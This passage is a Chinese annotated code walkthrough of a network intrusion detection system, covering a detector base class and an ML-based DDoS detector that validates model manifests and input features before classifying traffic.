| 14 | 导入对象：从指定模块引入类、函数或常量。 | `from dataclasses import dataclass, field` |
| 15 | 导入对象：从指定模块引入类、函数或常量。 | `from typing import Any, Optional` |
| 16 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 17 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 18 | 装饰器：为下面的函数或类附加框架行为。 | `@dataclass` |
| 19 | 类定义：声明 `DetectionResult`，封装相关状态与行为。 | `class DetectionResult:` |
| 20 | 文档字符串边界：开始或结束模块/类/函数说明。 | `    """` |
| 21 | 代码语句：参与当前文件的业务流程或数据处理。 | `    单次检测结果。` |
| 22 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 23 | 代码语句：参与当前文件的业务流程或数据处理。 | `    Attributes:` |
| 24 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        threat_type: 威胁类型，取值范围：` |
| 25 | 代码语句：参与当前文件的业务流程或数据处理。 | `            'ddos' \| 'intrusion' \| 'web_attack' \| 'anomaly' \| 'normal'` |
| 26 | 代码语句：参与当前文件的业务流程或数据处理。 | `            融合引擎可能会输出 'A + B' 这种拼接后的复合类型。` |
| 27 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        threat_level: 威胁等级，取值范围：` |
| 28 | 代码语句：参与当前文件的业务流程或数据处理。 | `            'low' \| 'medium' \| 'high' \| 'critical'` |
| 29 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        confidence: 置信度，区间 [0.0, 1.0]` |
| 30 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        details: 对本次检测结果的人类可读文字描述` |
| 31 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        source_ip: 触发本次检测的来源 IP，默认空字符串` |
| 32 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        raw_data: 原始数据（如特征字典），默认空字典` |
| 33 | 文档字符串边界：开始或结束模块/类/函数说明。 | `    """` |
| 34 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 35 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    threat_type: str` |
| 36 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    threat_level: str` |
| 37 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    confidence: float` |
| 38 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    details: str` |
| 39 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    source_ip: str = ""` |
| 40 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    raw_data: dict = field(default_factory=dict)` |
| 41 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 42 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 43 | 类定义：声明 `BaseDetector`，封装相关状态与行为。 | `class BaseDetector(ABC):` |
| 44 | 文档字符串边界：开始或结束模块/类/函数说明。 | `    """` |
| 45 | 代码语句：参与当前文件的业务流程或数据处理。 | `    检测引擎抽象基类。` |
| 46 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 47 | 代码语句：参与当前文件的业务流程或数据处理。 | `    所有具体检测引擎（DDoSDetector / IntrusionDetector /` |
| 48 | 代码语句：参与当前文件的业务流程或数据处理。 | `    WebAttackDetector / AnomalyDetector）必须继承本类并实现` |
| 49 | 代码语句：参与当前文件的业务流程或数据处理。 | `    \`detect\` 与 \`load_model\` 方法。` |
| 50 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 51 | 代码语句：参与当前文件的业务流程或数据处理。 | `    统一接口的目的是：` |
| 52 | 代码语句：参与当前文件的业务流程或数据处理。 | `        - 让融合决策引擎以统一方式调用所有引擎` |
| 53 | 代码语句：参与当前文件的业务流程或数据处理。 | `        - 让主控制器能够统一进行模型加载、健康检查和容错降级` |
| 54 | 文档字符串边界：开始或结束模块/类/函数说明。 | `    """` |
| 55 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 56 | 装饰器：为下面的函数或类附加框架行为。 | `    @abstractmethod` |
| 57 | 函数定义：声明 `detect` 的输入、处理逻辑和返回结果。 | `    def detect(self, features: Any) -> Optional[DetectionResult]:` |
| 58 | 文档字符串边界：开始或结束模块/类/函数说明。 | `        """` |
| 59 | 代码语句：参与当前文件的业务流程或数据处理。 | `        对输入特征执行检测。` |
| 60 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 61 | 代码语句：参与当前文件的业务流程或数据处理。 | `        Args:` |
| 62 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            features: 输入特征，通常为 dict。也可以是模型专属的结构化数据。` |
| 63 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 64 | 代码语句：参与当前文件的业务流程或数据处理。 | `        Returns:` |
| 65 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            DetectionResult: 检测结果。` |
| 66 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            None: 模型未加载或无法判定时返回 None，交由上层容错处理。` |
| 67 | 文档字符串边界：开始或结束模块/类/函数说明。 | `        """` |
| 68 | 抛出异常：主动报告不可继续的错误。 | `        raise NotImplementedError` |
| 69 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 70 | 装饰器：为下面的函数或类附加框架行为。 | `    @abstractmethod` |
| 71 | 函数定义：声明 `load_model` 的输入、处理逻辑和返回结果。 | `    def load_model(self, model_path: str) -> None:` |
| 72 | 文档字符串边界：开始或结束模块/类/函数说明。 | `        """` |
| 73 | 代码语句：参与当前文件的业务流程或数据处理。 | `        从指定路径加载检测引擎所需的模型文件。` |
| 74 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 75 | 代码语句：参与当前文件的业务流程或数据处理。 | `        模型路径必须通过参数传入，禁止在实现中硬编码。` |
| 76 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 77 | 代码语句：参与当前文件的业务流程或数据处理。 | `        Args:` |
| 78 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            model_path: 模型文件（或目录）的绝对/相对路径。` |
| 79 | 文档字符串边界：开始或结束模块/类/函数说明。 | `        """` |
| 80 | 抛出异常：主动报告不可继续的错误。 | `        raise NotImplementedError` |
| 81 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 82 | 函数定义：声明 `clear_ml_state` 的输入、处理逻辑和返回结果。 | `    def clear_ml_state(self) -> None:` |
| 83 | 文档字符串：说明当前模块、类或函数的职责。 | `        """由 ModelRegistry 在加载失败或重载前清理 ML 状态（规则引擎子类可为空操作）。"""` |
| 84 | 返回结果：把处理后的值交回调用方。 | `        return` |
| 85 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 86 | 装饰器：为下面的函数或类附加框架行为。 | `    @property` |
| 87 | 函数定义：声明 `is_ready` 的输入、处理逻辑和返回结果。 | `    def is_ready(self) -> bool:` |
| 88 | 文档字符串边界：开始或结束模块/类/函数说明。 | `        """` |
| 89 | 代码语句：参与当前文件的业务流程或数据处理。 | `        检测引擎是否已就绪。` |
| 90 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 91 | 代码语句：参与当前文件的业务流程或数据处理。 | `        子类应根据内部 model / scaler 等状态重写此属性，` |
| 92 | 代码语句：参与当前文件的业务流程或数据处理。 | `        默认返回 True 以兼容无需模型的规则引擎。` |
| 93 | 文档字符串边界：开始或结束模块/类/函数说明。 | `        """` |
| 94 | 返回结果：把处理后的值交回调用方。 | `        return True` |

## `src/detectors/ddos_detector.py`

- 类型：检测模型/规则
- 行数：214

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 2 | 代码语句：参与当前文件的业务流程或数据处理。 | `DDoS 检测引擎` |
| 3 | 代码语句：参与当前文件的业务流程或数据处理。 | `对应架构文档 §5.4.1 DDoS 检测（随机森林首选方案）` |
| 4 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 5 | 代码语句：参与当前文件的业务流程或数据处理。 | `加载须伴随 \`\`*.model_manifest.json\`\`；禁止无清单静默上线。` |
| 6 | 代码语句：参与当前文件的业务流程或数据处理。 | `生产可信 tabular：在线字段须完整覆盖 feature_columns；NSL-KDD 原型须` |
| 7 | 代码语句：参与当前文件的业务流程或数据处理。 | `\`\`trust_tier=prototype_nsl_kdd\`\` + \`\`NSLKDDAdapter\`\`，并在每次推理审计零填充列。` |
| 8 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 9 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 10 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 11 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import logging` |
| 12 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import os` |
| 13 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import time` |
| 14 | 导入对象：从指定模块引入类、函数或常量。 | `from typing import Any, Dict, List, Optional` |
| 15 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 16 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import joblib` |
| 17 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import numpy as np` |
| 18 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 19 | 导入对象：从指定模块引入类、函数或常量。 | `from src.schema.feature_schemas import (` |
| 20 | 代码语句：参与当前文件的业务流程或数据处理。 | `    production_tabular_keys_present,` |
| 21 | 代码语句：参与当前文件的业务流程或数据处理。 | `    validate_payload_against_schema,` |
| 22 | 函数调用：执行已有函数/方法完成当前步骤。 | `)` |
| 23 | 导入对象：从指定模块引入类、函数或常量。 | `from src.schema.inference_guard import ml_degraded_normal` |
| 24 | 导入对象：从指定模块引入类、函数或常量。 | `from src.schema.manifest import ManifestLoadError, ModelManifest, resolve_model_entry` |
| 25 | 导入对象：从指定模块引入类、函数或常量。 | `from src.schema.nsl_kdd_adapter import NSLKDDAdapter, NSL_KDD_FEATURE_COLUMNS` |
| 26 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 27 | 导入对象：从指定模块引入类、函数或常量。 | `from .base import BaseDetector, DetectionResult` |
| 28 | 导入对象：从指定模块引入类、函数或常量。 | `from .inference_meta import set_inference_meta` |
| 29 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 30 | 日志记录：输出运行状态、调试信息或异常线索。 | `logger = logging.getLogger(__name__)` |
| 31 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 32 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 33 | 类定义：声明 `DDoSDetector`，封装相关状态与行为。 | `class DDoSDetector(BaseDetector):` |
| 34 | 文档字符串：说明当前模块、类或函数的职责。 | `    """DDoS 检测引擎（随机森林 + manifest 契约）。"""` |
| 35 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 36 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    HIGH_CONFIDENCE_THRESHOLD: float = 0.8` |
| 37 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 38 | 函数定义：声明 `__init__` 的输入、处理逻辑和返回结果。 | `    def __init__(self) -> None:` |
| 39 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.model = None` |
| 40 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._manifest: Optional[ModelManifest] = None` |
| 41 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 42 | 函数定义：声明 `clear_ml_state` 的输入、处理逻辑和返回结果。 | `    def clear_ml_state(self) -> None:` |
| 43 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.model = None` |
| 44 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._manifest = None` |
| 45 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 46 | 函数定义：声明 `load_model` 的输入、处理逻辑和返回结果。 | `    def load_model(self, model_path: str) -> None:` |
| 47 | 函数调用：执行已有函数/方法完成当前步骤。 | `        self.clear_ml_state()` |
| 48 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 49 | 函数调用：执行已有函数/方法完成当前步骤。 | `            ap, manifest = resolve_model_entry(model_path)` |
| 50 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except ManifestLoadError as exc:` |
| 51 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.error("[AUDIT] DDoS 模型拒绝加载（manifest 无效）: %s", exc)` |
| 52 | 代码语句：参与当前文件的业务流程或数据处理。 | `            raise` |
| 53 | 条件判断：满足条件时进入对应分支。 | `        if not os.path.isfile(ap):` |
| 54 | 抛出异常：主动报告不可继续的错误。 | `            raise FileNotFoundError(ap)` |
| 55 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        model = joblib.load(ap)` |
| 56 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        n_feat = getattr(model, "n_features_in_", len(manifest.feature_columns))` |
| 57 | 条件判断：满足条件时进入对应分支。 | `        if int(n_feat) != len(manifest.feature_columns):` |
| 58 | 抛出异常：主动报告不可继续的错误。 | `            raise ManifestLoadError(` |
| 59 | 函数调用：执行已有函数/方法完成当前步骤。 | `                f"模型 n_features_in_={n_feat} 与 manifest feature_columns={len(manifest.feature_columns)} 不一致"` |
| 60 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 61 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._manifest = manifest` |
| 62 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.model = model` |
| 63 | 日志记录：输出运行状态、调试信息或异常线索。 | `        logger.info(` |
| 64 | 函数调用：执行已有函数/方法完成当前步骤。 | `            "[DDoSDetector] 模型+manifest 加载成功 trust_tier=%s schema=%s (%s)",` |
| 65 | 代码语句：参与当前文件的业务流程或数据处理。 | `            manifest.trust_tier,` |
| 66 | 代码语句：参与当前文件的业务流程或数据处理。 | `            manifest.schema_name,` |
| 67 | 代码语句：参与当前文件的业务流程或数据处理。 | `            ap,` |
| 68 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 69 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 70 | 装饰器：为下面的函数或类附加框架行为。 | `    @property` |
| 71 | 函数定义：声明 `is_ready` 的输入、处理逻辑和返回结果。 | `    def is_ready(self) -> bool:` |
| 72 | 返回结果：把处理后的值交回调用方。 | `        return self.model is not None and self._manifest is not None` |
| 73 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 74 | 函数定义：声明 `detect` 的输入、处理逻辑和返回结果。 | `    def detect(self, features: Dict) -> Optional[DetectionResult]:` |
| 75 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        t0 = time.perf_counter()` |
| 76 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 77 | 函数定义：声明 `finish` 的输入、处理逻辑和返回结果。 | `        def finish(res: Optional[DetectionResult]) -> Optional[DetectionResult]:` |
| 78 | 返回结果：把处理后的值交回调用方。 | `            return set_inference_meta(` |
| 79 | 代码语句：参与当前文件的业务流程或数据处理。 | `                res,` |
| 80 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                engine="DDoSDetector",` |
| 81 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                manifest=self._manifest,` |
| 82 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                latency_ms=(time.perf_counter() - t0) * 1000.0,` |
| 83 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 84 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 85 | 条件判断：满足条件时进入对应分支。 | `        if not self.is_ready or self._manifest is None:` |
| 86 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.debug("[DDoSDetector] 模型未加载，返回 None")` |
| 87 | 返回结果：把处理后的值交回调用方。 | `            return finish(None)` |
| 88 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 89 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        m = self._manifest` |
| 90 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        src_ip = str(features.get("src_ip", "") or "").strip()` |
| 91 | 条件判断：满足条件时进入对应分支。 | `        if not src_ip:` |
| 92 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            nf = features.get("network_flow_v1")` |
| 93 | 条件判断：满足条件时进入对应分支。 | `            if isinstance(nf, dict):` |
| 94 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                src_ip = str(nf.get("src_ip", "") or "").strip()` |
| 95 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 96 | 函数调用：执行已有函数/方法完成当前步骤。 | `        ok_schema, schema_errs = validate_payload_against_schema(` |
| 97 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "network_flow_v1", features` |
| 98 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 99 | 条件判断：满足条件时进入对应分支。 | `        if not ok_schema:` |
| 100 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.warning(` |
| 101 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "[AUDIT] DDoS network_flow_v1 契约失败: %s ip=%s",` |
| 102 | 代码语句：参与当前文件的业务流程或数据处理。 | `                schema_errs,` |
| 103 | 代码语句：参与当前文件的业务流程或数据处理。 | `                src_ip,` |
| 104 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 105 | 返回结果：把处理后的值交回调用方。 | `            return finish(` |
| 106 | 函数调用：执行已有函数/方法完成当前步骤。 | `                ml_degraded_normal(` |
| 107 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    engine="DDoSDetector",` |
| 108 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    reason="network_flow_v1 契约失败: " + "; ".join(schema_errs),` |
| 109 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    source_ip=src_ip,` |
| 110 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    extra={"schema_errors": schema_errs},` |
| 111 | 函数调用：执行已有函数/方法完成当前步骤。 | `                )` |
| 112 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 113 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 114 | 条件判断：满足条件时进入对应分支。 | `        if m.trust_tier == "production" and m.adapter is None:` |
| 115 | 函数调用：执行已有函数/方法完成当前步骤。 | `            ok_keys, missing = production_tabular_keys_present(` |
| 116 | 代码语句：参与当前文件的业务流程或数据处理。 | `                m.feature_columns, features` |
| 117 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 118 | 条件判断：满足条件时进入对应分支。 | `            if not ok_keys:` |
| 119 | 日志记录：输出运行状态、调试信息或异常线索。 | `                logger.warning(` |
| 120 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "[AUDIT] DDoS 生产 ML 缺字段（拒绝静默填 0）: %s ip=%s",` |
| 121 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    missing,` |
| 122 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    src_ip,` |
| 123 | 函数调用：执行已有函数/方法完成当前步骤。 | `                )` |
| 124 | 返回结果：把处理后的值交回调用方。 | `                return finish(` |
| 125 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    ml_degraded_normal(` |
| 126 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        engine="DDoSDetector",` |
| 127 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        reason="在线特征缺字段: " + ", ".join(missing),` |
| 128 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        source_ip=src_ip,` |
| 129 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        extra={"missing_columns": missing},` |
| 130 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    )` |
| 131 | 函数调用：执行已有函数/方法完成当前步骤。 | `                )` |
| 132 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            feature_vector: List[float] = []` |
| 133 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            flat: Dict[str, Any] = dict(features)` |
| 134 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            nf = features.get("network_flow_v1")` |
| 135 | 条件判断：满足条件时进入对应分支。 | `            if isinstance(nf, dict):` |
| 136 | 循环：逐个处理集合或迭代器中的元素。 | `                for k, v in nf.items():` |
| 137 | 条件判断：满足条件时进入对应分支。 | `                    if k not in ("schema_name", "schema_version", "schema"):` |
| 138 | 函数调用：执行已有函数/方法完成当前步骤。 | `                        flat.setdefault(k, v)` |
| 139 | 循环：逐个处理集合或迭代器中的元素。 | `            for col in m.feature_columns:` |
| 140 | 函数调用：执行已有函数/方法完成当前步骤。 | `                feature_vector.append(float(flat[col]))` |
| 141 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            X = np.array([feature_vector], dtype=np.float64)` |
| 142 | 条件分支：前面条件不满足时继续判断。 | `        elif m.trust_tier == "prototype_nsl_kdd" and m.adapter == "nsl_kdd_v1":` |
| 143 | 函数调用：执行已有函数/方法完成当前步骤。 | `            vec, audit = NSLKDDAdapter.build_vector_in_order(features, m.feature_columns)` |
| 144 | 条件判断：满足条件时进入对应分支。 | `            if audit.get("zero_filled_columns"):` |
| 145 | 日志记录：输出运行状态、调试信息或异常线索。 | `                logger.warning(` |
| 146 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    "[AUDIT] DDoS NSL-KDD 原型推理（零填充/无编码列）cols=%s ip=%s",` |
| 147 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    audit["zero_filled_columns"],` |
| 148 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    src_ip,` |
| 149 | 函数调用：执行已有函数/方法完成当前步骤。 | `                )` |
| 150 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            X = np.array([vec], dtype=np.float64)` |
| 151 | 兜底分支：处理前面条件都不满足的情况。 | `        else:` |
| 152 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.error("[AUDIT] DDoS manifest trust/adapter 组合不受支持")` |
| 153 | 返回结果：把处理后的值交回调用方。 | `            return finish(` |
| 154 | 函数调用：执行已有函数/方法完成当前步骤。 | `                ml_degraded_normal(` |
| 155 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    engine="DDoSDetector",` |
| 156 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    reason="manifest trust_tier/adapter 不受支持",` |
| 157 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    source_ip=src_ip,` |
| 158 | 函数调用：执行已有函数/方法完成当前步骤。 | `                )` |
| 159 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 160 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 161 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 162 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            prediction = self.model.predict(X)[0]` |
| 163 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            probabilities = self.model.predict_proba(X)[0]` |
| 164 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except Exception as exc:` |
| 165 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.error("[DDoSDetector] 模型推理失败: %s", exc)` |
| 166 | 返回结果：把处理后的值交回调用方。 | `            return finish(None)` |
| 167 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 168 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        class_labels = list(getattr(self.model, "classes_", []))` |
| 169 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        raw_extra: Dict[str, Any] = {"prediction": str(prediction)}` |
| 170 | 条件判断：满足条件时进入对应分支。 | `        if m.trust_tier == "prototype_nsl_kdd":` |
| 171 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            raw_extra["trust_tier"] = m.trust_tier` |
| 172 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            raw_extra["nsl_kdd_adapter"] = m.adapter` |
| 173 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 174 | 条件判断：满足条件时进入对应分支。 | `        if str(prediction).lower() == "normal":` |
| 175 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            normal_prob = float(` |
| 176 | 函数调用：执行已有函数/方法完成当前步骤。 | `                probabilities[class_labels.index(prediction)]` |
| 177 | 条件判断：满足条件时进入对应分支。 | `                if prediction in class_labels` |
| 178 | 兜底分支：处理前面条件都不满足的情况。 | `                else probabilities[0]` |
| 179 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 180 | 返回结果：把处理后的值交回调用方。 | `            return finish(` |
| 181 | 函数调用：执行已有函数/方法完成当前步骤。 | `                DetectionResult(` |
| 182 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    threat_type="normal",` |
| 183 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    threat_level="low",` |
| 184 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    confidence=normal_prob,` |
| 185 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    details="DDoS 检测：正常流量",` |
| 186 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    source_ip=src_ip,` |
| 187 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    raw_data=raw_extra,` |
| 188 | 函数调用：执行已有函数/方法完成当前步骤。 | `                )` |
| 189 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 190 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 191 | 条件判断：满足条件时进入对应分支。 | `        if prediction in class_labels:` |
| 192 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            attack_prob = float(probabilities[class_labels.index(prediction)])` |
| 193 | 兜底分支：处理前面条件都不满足的情况。 | `        else:` |
| 194 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            attack_prob = float(np.max(probabilities))` |
| 195 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 196 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        threat_level = "high" if attack_prob > self.HIGH_CONFIDENCE_THRESHOLD else "medium"` |
| 197 | 日志记录：输出运行状态、调试信息或异常线索。 | `        logger.info(` |
| 198 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "[DDoSDetector] 检出 DDoS：class=%s confidence=%.4f level=%s ip=%s",` |
| 199 | 代码语句：参与当前文件的业务流程或数据处理。 | `            prediction,` |
| 200 | 代码语句：参与当前文件的业务流程或数据处理。 | `            attack_prob,` |
| 201 | 代码语句：参与当前文件的业务流程或数据处理。 | `            threat_level,` |
| 202 | 代码语句：参与当前文件的业务流程或数据处理。 | `            src_ip,` |
| 203 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 204 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        raw_extra["proba"] = probabilities.tolist()` |
| 205 | 返回结果：把处理后的值交回调用方。 | `        return finish(` |
| 206 | 函数调用：执行已有函数/方法完成当前步骤。 | `            DetectionResult(` |
| 207 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                threat_type="ddos",` |
| 208 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                threat_level=threat_level,` |
| 209 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                confidence=attack_prob,` |
| 210 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                details=f"DDoS 攻击检测：类别={prediction}",` |
| 211 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                source_ip=src_ip,` |
| 212 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                raw_data=raw_extra,` |
| 213 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 214 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |

## `src/detectors/inference_meta.py`

- 类型：检测模型/规则
- 行数：42

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串：说明当前模块、类或函数的职责。 | `"""为检测结果附加推理可观测字段（engine / model_version / schema_version / latency_ms）。"""` |
| 2 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 3 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 4 | 导入对象：从指定模块引入类、函数或常量。 | `from typing import Optional` |
| 5 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 6 | 导入对象：从指定模块引入类、函数或常量。 | `from src.detectors.base import DetectionResult` |
| 7 | 导入对象：从指定模块引入类、函数或常量。 | `from src.schema.manifest import ModelManifest` |
| 8 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 9 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
